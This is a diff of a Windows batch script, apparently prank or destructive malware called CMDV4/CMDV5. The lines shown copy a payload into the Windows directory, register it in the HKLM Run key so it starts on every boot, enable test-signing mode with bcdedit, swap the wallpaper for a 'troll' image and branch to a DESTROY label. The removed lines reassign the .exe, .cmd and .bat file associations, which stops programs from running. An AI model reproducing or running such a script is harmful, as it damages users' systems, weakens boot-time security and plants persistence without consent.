@@ -1,5 +1,5 @@
 @echo off
-TITLE CMDV4
+TITLE CMDV5
 echo Loading...
 SFC /ScanFile="C:\Windows\system32\net.exe"
 cls
@@ -208,7 +208,7 @@ xcopy %CD%\junkins\startup\startup.bat c:\windows\payload\startup.bat /y /q /h
 xcopy %CD%\junkins\walp\walp.bmp c:\windows\wallpapertroll\walp.bmp /y /q /h
 bcdedit /set TESTSIGNING on
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d c:\windows\wallpapertroll\walp.bmp /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v cmdv4 /t REG_SZ /d c:\windows\payload\startup.bat
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v cmdv5 /t REG_SZ /d c:\windows\payload\startup.bat
 RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
 goto AAAAJJ
 :AAAAJJ
@@ -218,7 +218,4 @@ cls
 goto RESTART
 :BCD
 bcdedit /set TESTSIGNING on
-assoc .exe=jaydumb
-assoc .cmd=windfufBest
-assoc .bat=CmdV4
 goto DESTROY
